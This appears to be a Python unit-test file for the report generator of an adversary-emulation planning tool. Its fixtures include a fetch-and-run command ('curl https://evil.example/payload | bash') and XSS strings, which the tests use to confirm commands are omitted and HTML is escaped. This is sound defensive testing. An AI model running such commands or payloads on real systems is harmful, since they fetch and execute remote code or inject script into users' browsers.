import unittest
from unittest.mock import patch

from backend.reporting import build_report, render_html, render_pdf, report_filename
from tests.test_execution_kit import plan_fixture


class EngagementReportingTests(unittest.TestCase):
    def test_report_rebinds_catalog_metadata_and_omits_commands(self):
        document = plan_fixture("linux", command="curl https://evil.example/payload | bash")
        report = build_report(document)
        body = render_html(report).decode("utf-8")
        self.assertNotIn("evil.example", body)
        self.assertNotIn("COMMAND:", body)
        self.assertIn("Expected telemetry", body)
        self.assertIn("T1059.004", body)
        self.assertIn("Planner boundary", body)
        self.assertIn("default-src 'none'", body)

    def test_html_escapes_plan_and_evidence_text(self):
        document = plan_fixture("linux")
        document["actor"]["name"] = "Fixture <script>alert(1)</script>"
        document["stages"][0]["techniques"][0]["execution"] = {
            "outcome": "passed",
            "detection_result": "alerted",
            "notes": "Observed <img src=x onerror=alert(1)>",
        }
        body = render_html(build_report(document)).decode("utf-8")
        self.assertNotIn("<script>alert(1)</script>", body)
        self.assertNotIn("<img src=x", body)
        self.assertIn("&lt;script&gt;alert(1)&lt;/script&gt;", body)
        self.assertIn("&lt;img src=x onerror=alert(1)&gt;", body)

    def test_report_calculates_detection_and_execution_gaps(self):
        report = build_report(plan_fixture("linux"))
        categories = {gap.category for gap in report.gaps}
        self.assertIn("Execution coverage", categories)
        self.assertIn("Detection validation", categories)
        self.assertEqual(report.recorded, 0)
        self.assertEqual(report.detection_assessed, 0)

    def test_catalog_sigma_reference_is_rendered_only_when_present(self):
        document = plan_fixture("linux")
        command = dict(document["stages"][0]["techniques"][0]["command"])
        command["sigma_rules"] = [{
            "title": "Shell Download Activity",
            "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/example.yml",
        }]
        with patch("backend.execution_kit.command_catalog.get_commands", return_value={
            "source": "curated", "commands": [command],
        }):
            report = build_report(document)
        self.assertEqual(report.techniques[0].sigma_references[0].label, "Shell Download Activity")
        body = render_html(report).decode("utf-8")
        self.assertIn("github.com/SigmaHQ/sigma", body)

    def test_report_supports_an_all_unsupported_plan_to_explain_gaps(self):
        document = plan_fixture("linux")
        document["scope"]["curated_only"] = True
        with patch("backend.execution_kit.command_catalog.get_commands", return_value={
            "source": "fallback", "commands": [document["stages"][0]["techniques"][0]["command"]],
        }):
            report = build_report(document)
        self.assertFalse(report.techniques[0].supported)
        self.assertIn("Catalog coverage", {gap.category for gap in report.gaps})

    def test_pdf_is_paginated_valid_pdf_with_no_command_body(self):
        document = plan_fixture("linux", duplicate=True, command="UNTRUSTED COMMAND BODY")
        report = build_report(document)
        body = render_pdf(report)
        self.assertTrue(body.startswith(b"%PDF-1.7"))
        self.assertTrue(body.rstrip().endswith(b"%%EOF"))
        self.assertIn(b"Fixture Actor", body)
        self.assertIn(b"Technique results", body)
        self.assertNotIn(b"UNTRUSTED COMMAND BODY", body)
        self.assertGreaterEqual(body.count(b"/Type /Page"), 2)

    def test_filename_is_safe_and_descriptive(self):
        document = plan_fixture("linux")
        document["actor"]["name"] = "Fixture / Actor"
        filename = report_filename(build_report(document), "pdf")
        self.assertEqual(filename, "AdversaryFlow_G0001_Fixture_Actor_report.pdf")


if __name__ == "__main__":
    unittest.main()
